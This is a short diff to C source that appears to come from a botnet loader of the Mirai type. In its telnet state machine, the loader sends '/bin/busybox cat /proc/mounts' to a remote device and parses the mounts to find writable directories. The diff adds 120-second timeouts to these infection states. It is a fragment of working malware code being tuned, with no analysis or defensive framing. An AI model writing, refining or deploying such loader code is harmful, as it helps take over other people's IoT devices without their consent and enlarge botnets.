@@ -337,12 +337,16 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         {
                             util_sockprintf(conn->fd, "/bin/busybox cat /proc/mounts; " TOKEN_QUERY "\r\n");
                             conn->state_telnet = TELNET_PARSE_MOUNTS;
+                            conn->timeout = 120;
                         }
                         break;
                     case TELNET_PARSE_MOUNTS:
                         consumed = connection_consume_mounts(conn);
                         if (consumed)
+                        {
                             conn->state_telnet = TELNET_READ_WRITEABLE;
+                            conn->timeout = 120;
+                        }
                         break;
                     case TELNET_READ_WRITEABLE:
                         consumed = connection_consume_written_dirs(conn);
